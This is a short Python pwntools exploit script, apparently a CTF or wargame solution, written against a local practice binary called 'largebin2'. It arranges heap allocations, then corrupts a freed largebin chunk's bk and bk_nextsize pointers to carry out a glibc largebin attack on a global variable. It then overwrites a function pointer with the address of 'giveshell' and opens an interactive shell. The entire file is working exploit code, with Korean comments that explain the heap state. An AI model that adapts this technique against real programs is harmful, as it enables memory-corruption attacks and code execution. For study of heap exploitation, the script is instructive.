from pwn import *

p = process("./largebin2")
e = ELF("./largebin2")

def malloc(size):
	p.sendlineafter(b">", b"1")
	p.sendlineafter(b"Size: ", str(size).encode())
def free(idx):
	p.sendlineafter(b">", b"2")
	p.sendlineafter(b"Index: ", str(idx).encode())
def edit(idx, data):
	p.sendlineafter(b">", b"3")
	p.sendlineafter(b"Index: ", str(idx).encode())
	p.sendlineafter(b"Data: ", data)
def call():
	p.sendlineafter(b">", b"4")
	p.interactive()

giveshell = e.symbols["giveshell"]

malloc(0x320) # 0 -> smallbin
malloc(0x100) # 1 -> 병합방지
malloc(0x400) # 2 -> largebin
malloc(0x100) # 3 -> 병합방지
malloc(0x410) # 4 -> largebin
malloc(0x100) # 5 -> 병합방지

free(0) # unsortedbin : 0
free(2) # unsortedbin : 0 -> 2

malloc(0x100) # unsortedbin : 0, largebin : 2
free(4) # unsortedbin : 0 -> 4, largebin : 2

payload = p64(0) + p64(e.symbols["c"]-0x10)
payload += p64(0) + p64(e.symbols["c"]-0x20)

edit(2, payload) # largebin attack
malloc(0x100) # largebin fd = 0, bk = &c-0x10, fd_nextsize = 0, bk_nextsize = &c-0x20

payload = b"A"*0x10
payload += p64(0)
payload += p64(giveshell)
edit(4, payload)

call()
